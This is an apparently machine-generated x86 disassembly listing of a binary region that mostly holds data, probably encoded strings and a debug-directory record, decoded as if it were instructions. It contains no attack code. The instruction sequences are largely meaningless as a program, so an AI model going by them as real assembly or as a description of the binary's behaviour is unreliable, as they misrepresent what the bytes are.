  433736:	xor    esi,DWORD PTR [edx]
  433738:	pop    edi
  433739:	xor    al,0x4b
  43373b:	add    BYTE PTR [eax+0x49],cl
  43373e:	push   ebp
  43373f:	xor    al,0x5f
  433741:	dec    esp
  433742:	inc    edx
  433743:	dec    ecx
  433744:	cmp    DWORD PTR [edi+ebx*2],esi
  433747:	pop    ecx
  433748:	inc    edi
  433749:	add    BYTE PTR [eax+0x50],bl
  43374c:	dec    eax
  43374d:	pop    edi
  43374e:	push   ebp
  43374f:	push   ecx
  433750:	inc    edi
  433751:	xor    cl,BYTE PTR [edx+0x38]
  433754:	push   esi
  433755:	add    BYTE PTR [ebx+0x4a],al
  433758:	push   edx
  433759:	pop    edi
  43375a:	dec    edi
  43375b:	dec    eax
  43375c:	dec    edi
  43375d:	dec    edi
  43375e:	dec    edx
  43375f:	add    BYTE PTR [ecx+0x52],al
  433762:	cmp    DWORD PTR [edi+0x56],ebx
  433765:	aaa    
  433766:	dec    esp
  433767:	cmp    DWORD PTR [ebx+0x5f],eax
  43376a:	push   edx
  43376b:	inc    esp
  43376c:	add    BYTE PTR [ecx+0x37],bl
  43376f:	inc    esp
  433770:	pop    edi
  433771:	dec    ecx
  433772:	xor    esi,DWORD PTR [edi]
  433774:	xor    DWORD PTR [edi+0x49],ebx
  433777:	push   esp
  433778:	xor    eax,DWORD PTR [eax]
  43377a:	push   edx
  43377b:	xor    BYTE PTR [eax+0x5f],bl
  43377e:	dec    eax
  43377f:	push   edi
  433780:	inc    esi
  433781:	xor    DWORD PTR [edi+0x5f],edx
  433784:	cmp    BYTE PTR [ebx+0x37],dl
  433787:	add    BYTE PTR [esi+0x42],dl
  43378a:	dec    ecx
  43378b:	xor    ebx,DWORD PTR [edi+0x45]
  43378e:	xor    BYTE PTR [ebp+0x5f],cl
  433791:	xor    al,0x34
  433793:	xor    BYTE PTR [edx+0x5f],cl
  433796:	inc    edi
  433797:	add    BYTE PTR [edx+0x57],dl
  43379a:	xor    ebx,DWORD PTR [edi+0x31]
  43379d:	dec    edx
  43379e:	push   edi
  43379f:	xor    eax,0x4d435f
  4337a4:	dec    ecx
  4337a5:	xor    eax,0x36365f39
  4337aa:	dec    eax
  4337ab:	xor    BYTE PTR [eax],al
  4337ad:	dec    edi
  4337ae:	inc    ebx
  4337af:	push   edi
  4337b0:	pop    edi
  4337b1:	inc    edi
  4337b2:	xor    al,BYTE PTR ss:[ecx+esi*1+0x4a]
  4337b7:	add    BYTE PTR [edx+0x58],al
  4337ba:	inc    edi
  4337bb:	ss pop edi
  4337bd:	push   esi
  4337be:	inc    ebx
  4337bf:	dec    esi
  4337c0:	inc    esp
  4337c1:	add    BYTE PTR [edi+0x4d],cl
  4337c4:	inc    edi
  4337c5:	xor    ebx,DWORD PTR [edi+0x34]
  4337c8:	dec    esi
  4337c9:	pop    edx
  4337ca:	cmp    BYTE PTR [edi+0x58],bl
  4337cd:	cmp    BYTE PTR [eax],al
  4337cf:	push   edx
  4337d0:	pop    eax
  4337d1:	push   ecx
  4337d2:	pop    edi
  4337d3:	dec    esp
  4337d4:	push   edx
  4337d5:	dec    ecx
  4337d6:	dec    edi
  4337d7:	inc    esp
  4337d8:	pop    edi
  4337d9:	dec    edi
  4337da:	xor    eax,DWORD PTR [eax+eax*1+0x43]
  4337de:	push   eax
  4337df:	inc    ebp
  4337e0:	pop    edi
  4337e1:	xor    eax,0x565f3945
  4337e6:	add    BYTE PTR [edi+0x4e],al
  4337e9:	push   esi
  4337ea:	pop    edi
  4337eb:	inc    edi
  4337ec:	push   esp
  4337ed:	dec    eax
  4337ee:	xor    dh,BYTE PTR [ecx]
  4337f0:	pop    edi
  4337f1:	dec    edi
  4337f2:	xor    eax,DWORD PTR ss:[eax]
  4337f5:	inc    esp
  4337f6:	inc    ebp
  4337f7:	dec    ecx
  4337f8:	pop    edi
  4337f9:	push   edx
  4337fa:	dec    eax
  4337fb:	xor    al,0x48
  4337fd:	dec    ecx
  4337fe:	ss pop edi
  433800:	aaa    
  433801:	aaa    
  433802:	dec    ecx
  433803:	dec    ebp
  433804:	add    BYTE PTR [eax+0x54],cl
  433807:	ss pop edi
  433809:	inc    esi
  43380a:	inc    edx
  43380b:	xor    dh,BYTE PTR [eax+eax*1]
  43380e:	dec    esi
  43380f:	ss dec edx
  433811:	pop    edi
  433812:	dec    ecx
  433813:	dec    esp
  433814:	inc    edi
  433815:	inc    esp
  433816:	dec    eax
  433817:	xor    BYTE PTR [eax],bh
  433819:	xor    eax,0x4c344f00
  43381e:	xor    esi,DWORD PTR [edi]
  433820:	xor    BYTE PTR [edi+0x44],bl
  433823:	inc    edi
  433824:	dec    ebx
  433825:	xor    al,BYTE PTR [ecx+0x43]
  433828:	add    BYTE PTR [edi+0x32],cl
  43382b:	xor    ebx,DWORD PTR [edi+0x57]
  43382e:	xor    cl,BYTE PTR [edi+0x5f]
  433831:	pop    edx
  433832:	add    BYTE PTR [eax+0x4c],bl
  433835:	cmp    DWORD PTR [edi+0x4b],ebx
  433838:	inc    ecx
  433839:	dec    edx
  43383a:	inc    esi
  43383b:	xor    DWORD PTR [edi+ebx*2],esi
  43383e:	pop    eax
  43383f:	inc    edi
  433840:	inc    edx
  433841:	add    BYTE PTR [eax+0x33],dl
  433844:	dec    esi
  433845:	pop    edi
  433846:	dec    eax
  433847:	xor    eax,0x485f53
  43384c:	dec    ebp
  43384d:	xor    BYTE PTR [edx+0x5f],al
  433850:	dec    edx
  433851:	pop    eax
  433852:	push   esp
  433853:	dec    ecx
  433854:	dec    esp
  433855:	cmp    DWORD PTR [eax+eax*1+0x41],ecx
  433859:	xor    esi,DWORD PTR [eax]
  43385b:	pop    edi
  43385c:	inc    ecx
  43385d:	pop    edx
  43385e:	push   ecx
  43385f:	pop    edx
  433860:	cmp    DWORD PTR [esi],esi
  433862:	pop    edi
  433863:	dec    eax
  433864:	dec    esp
  433865:	pop    edx
  433866:	add    BYTE PTR [ecx+0x57],dl
  433869:	pop    ecx
  43386a:	pop    edi
  43386b:	push   esi
  43386c:	xor    al,0x44
  43386e:	xor    DWORD PTR [eax],edi
  433870:	xor    bl,BYTE PTR [edi+0x39]
  433873:	push   esp
  433874:	push   esp
  433875:	add    BYTE PTR [esi+0x0],dl
  433878:	dec    edi
  433879:	add    BYTE PTR [edi+0x0],al
  43387c:	add    BYTE PTR ss:[edi+0x0],bl
  433880:	dec    edi
  433881:	add    BYTE PTR [edx+0x0],bl
  433884:	inc    ebp
  433885:	add    BYTE PTR [eax],dh
  433887:	add    BYTE PTR [ebp+0x0],al
  43388a:	xor    BYTE PTR [eax],al
  43388c:	pop    edi
  43388d:	add    BYTE PTR [eax],dh
  43388f:	add    BYTE PTR ds:0x4f000000,dh
  433895:	add    BYTE PTR ds:0x5f005700,dh
  43389b:	add    BYTE PTR [edi],dh
  43389d:	add    BYTE PTR [ebx+0x0],dl
  4338a0:	push   ebp
  4338a1:	add    BYTE PTR [edi+0x0],al
  4338a4:	xor    al,0x0
  4338a6:	pop    edi
  4338a7:	add    BYTE PTR [ecx+0x0],dl
  4338aa:	inc    esp
  4338ab:	add    BYTE PTR [eax],al
  4338ad:	add    BYTE PTR [edx+0x0],dl
  4338b0:	push   esp
  4338b1:	add    BYTE PTR ds:0x52005f00,dh
  4338b7:	add    BYTE PTR [edi+0x0],dl
  4338ba:	xor    al,BYTE PTR [eax]
  4338bc:	xor    al,BYTE PTR [eax]
  4338be:	xor    BYTE PTR [eax],al
  4338c0:	xor    BYTE PTR [eax],al
  4338c2:	pop    edi
  4338c3:	add    BYTE PTR [esi],dh
  4338c5:	add    BYTE PTR [eax],al
  4338c7:	add    BYTE PTR [eax+0x0],cl
  4338ca:	inc    ebp
  4338cb:	add    BYTE PTR [eax+eax*1+0x30],cl
  4338cf:	add    BYTE PTR [edi+0x0],bl
  4338d2:	dec    edx
  4338d3:	add    BYTE PTR [edx],dh
  4338d5:	add    BYTE PTR [edi],dh
  4338d7:	add    BYTE PTR [ebp+0x0],dl
  4338da:	add    BYTE PTR ss:[eax],dh
  4338dd:	add    BYTE PTR [eax],al
  4338df:	add    BYTE PTR [esi+0x0],dl
  4338e2:	cmp    BYTE PTR [eax],al
  4338e4:	dec    edi
  4338e5:	add    BYTE PTR [ecx],bh
  4338e7:	add    BYTE PTR [edi+0x0],bl
  4338ea:	pop    eax
  4338eb:	add    BYTE PTR [edx+0x0],bl
  4338ee:	dec    esp
  4338ef:	add    BYTE PTR [ebx+0x0],cl
  4338f2:	add    BYTE PTR [eax],al
  4338f4:	dec    ecx
  4338f5:	add    BYTE PTR [ebp+0x0],dl
  4338f8:	dec    edi
  4338f9:	add    BYTE PTR [eax],bh
  4338fb:	add    BYTE PTR [edi+0x0],bl
  4338fe:	inc    esp
  4338ff:	add    BYTE PTR [eax],bh
  433901:	add    BYTE PTR [ecx+0x0],cl
  433904:	dec    eax
  433905:	add    BYTE PTR [edi+0x0],cl
  433908:	pop    edi
  433909:	add    BYTE PTR [ebp+0x0],al
  43390c:	pop    eax
  43390d:	add    BYTE PTR [eax],al
  43390f:	add    BYTE PTR [edx+0x0],dl
  433912:	dec    esp
  433913:	add    BYTE PTR [esi],dh
  433915:	add    BYTE PTR [edi+0x0],bl
  433918:	aaa    
  433919:	add    BYTE PTR [eax+0x0],bl
  43391c:	xor    eax,DWORD PTR [eax]
  43391e:	inc    edi
  43391f:	add    BYTE PTR [ecx+0x0],dl
  433922:	pop    edi
  433923:	add    BYTE PTR [edx+0x0],cl
  433926:	add    BYTE PTR [eax],al
  433928:	inc    edi
  433929:	add    BYTE PTR [edi+0x0],cl
  43392c:	push   ebx
  43392d:	add    BYTE PTR [eax+eax*1],dh
  433930:	pop    edi
  433931:	add    BYTE PTR [ecx+0x0],cl
  433934:	xor    DWORD PTR [eax],eax
  433936:	push   esi
  433937:	add    BYTE PTR [ebx],dh
  433939:	add    BYTE PTR [edi+0x0],bl
  43393c:	dec    ecx
  43393d:	add    BYTE PTR [edx+0x0],bl
  433940:	add    BYTE PTR [eax],al
  433942:	inc    ebx
  433943:	add    BYTE PTR [ecx+0x0],bl
  433946:	inc    ecx
  433947:	add    BYTE PTR [eax],dh
  433949:	add    BYTE PTR [ecx],bh
  43394b:	add    BYTE PTR [edi+0x0],bl
  43394e:	cmp    DWORD PTR [eax],eax
  433950:	push   eax
  433951:	add    BYTE PTR [eax+eax*1],dh
  433954:	pop    edx
  433955:	add    BYTE PTR [eax],al
  433957:	add    BYTE PTR [edx+0x0],al
  43395a:	inc    esi
  43395b:	add    BYTE PTR [eax+eax*1+0x5f],dl
  43395f:	add    BYTE PTR [ebp+0x0],dl
  433962:	push   ebp
  433963:	add    BYTE PTR [eax+eax*1+0x57],dl
  433967:	add    BYTE PTR [eax],al
  433969:	add    BYTE PTR [eax+eax*1+0x37],dl
  43396d:	add    BYTE PTR [eax+eax*1+0x38],dl
  433971:	add    BYTE PTR [edi+0x0],bl
  433974:	xor    eax,DWORD PTR [eax]
  433976:	cmp    DWORD PTR [eax],eax
  433978:	dec    eax
  433979:	add    BYTE PTR [edi+0x0],bl
  43397c:	dec    ebp
  43397d:	add    BYTE PTR [ecx+0x0],bl
  433980:	cmp    DWORD PTR [eax],eax
  433982:	inc    ecx
  433983:	add    BYTE PTR [esi+0x0],cl
  433986:	add    BYTE PTR [eax],al
  433988:	inc    ebx
  433989:	add    BYTE PTR [eax+0x0],dl
  43398c:	dec    esi
  43398d:	add    BYTE PTR [eax+eax*1],dh
  433990:	pop    edi
  433991:	add    BYTE PTR [eax+eax*1+0x54],cl
  433995:	add    BYTE PTR [ebx+0x0],cl
  433998:	xor    DWORD PTR [eax],eax
  43399a:	add    BYTE PTR [eax],al
  43399c:	inc    ecx
  43399d:	add    BYTE PTR [edi],dh
  43399f:	add    BYTE PTR [edx+0x0],cl
  4339a2:	pop    edi
  4339a3:	add    BYTE PTR [ebx+0x0],al
  4339a6:	cmp    BYTE PTR [eax],al
  4339a8:	push   edi
  4339a9:	add    BYTE PTR [eax+0x0],dl
  4339ac:	pop    edi
  4339ad:	add    BYTE PTR [eax+eax*1+0x4e],cl
  4339b1:	add    BYTE PTR [edx],dh
  4339b3:	add    BYTE PTR [eax],al
  4339b5:	add    BYTE PTR [edx+0x0],al
  4339b8:	add    BYTE PTR [eax],al
  4339ba:	push   edx
  4339bb:	push   ebx
  4339bc:	inc    esp
  4339bd:	push   ebx
  4339be:	jno    0x4339fc
  4339c0:	neg    DWORD PTR [ebx]
  4339c2:	rol    DWORD PTR [eax],1
  4339c4:	pop    ebx
  4339c5:	dec    eax
  4339c6:	stos   BYTE PTR es:[edi],al
  4339c7:	loope  0x433a33
  4339c9:	push   ebx
  4339ca:	ror    ebx,0xd0
  4339cd:	jnp    0x4339e2
  4339cf:	add    BYTE PTR [eax],al
  4339d1:	add    BYTE PTR [edi+0x3a],cl
  4339d4:	pop    esp
  4339d5:	jno    0x433a2b
  4339d7:	inc    esp
  4339d8:	jp     0x433a28
  4339da:	jb     0x433a36
  4339dc:	addr16 jne 0x433a42
  4339df:	jns    0x433a51
  4339e1:	jbe    0x433a3f
  4339e3:	push   0x62
  4339e5:	push   edi
  4339e6:	jns    0x433a60
  4339e8:	inc    ebp
  4339e9:	ins    DWORD PTR es:[edi],dx
  4339ea:	jbe    0x433a53
  4339ec:	popa   
  4339ed:	pop    esp
  4339ee:	je     0x433a5a
  4339f0:	pop    edx
  4339f1:	data16 jne 0x433a66
  4339f4:	ja     0x433a5e
  4339f6:	push   edx
  4339f7:	bound  eax,QWORD PTR [ebp+0x72]
  4339fa:	pop    esp
  4339fb:	dec    edx
  4339fc:	jae    0x433a42
  4339fe:	ins    DWORD PTR es:[edi],dx
  4339ff:	imul   ebp,DWORD PTR [eax+0x62],0x2e
  433a03:	jo     0x433a69
  433a05:	bound  eax,QWORD PTR [eax]
	...
